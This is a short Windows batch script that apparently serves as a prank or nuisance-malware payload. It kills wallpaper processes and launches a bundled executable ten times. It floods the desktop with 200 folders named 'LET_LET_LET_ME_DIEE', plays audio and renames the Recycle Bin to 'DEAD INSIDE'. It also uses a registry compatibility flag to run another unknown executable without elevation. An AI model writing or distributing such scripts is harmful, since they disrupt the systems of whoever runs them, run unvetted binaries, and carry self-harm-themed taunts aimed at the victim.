"%CD%\data\SetVol.exe" 75
::%SystemRoot%/system32/rundll32 user32, SwapMouseButton >nul
taskkill /t /f /im wallpaper32.exe
taskkill /t /f /im wallpaper64.exe
FOR /L %%i IN (1,1,10) DO Start "" "%CD%\data\1000 - 7.exe"
set papka=0
:1
set /A papka=papka+1
md %USERPROFILE%\Desktop\LET_LET_LET_ME_DIEE%papka%
if not %papka%==200 goto 1
start /min /wait /b "C:\Program Files (x86)\Windows Media Player\wmplayer.exe" "%CD%\data\1001.mp3"
reg add "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows NT\CurrentVersion\AppCompatFlags\Layers" /v "%CD%\data\New.exe" /t REG_SZ /d  RunAsInvoker /f
"%CD%\data\New.exe"
reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\CLSID\{645FF040-5081-101B-9F08-00AA002F954E}" /ve /t REG_SZ /d "" /f
reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\CLSID\{645FF040-5081-101B-9F08-00AA002F954E}" /ve /t REG_SZ /d "DEAD INSIDE" /f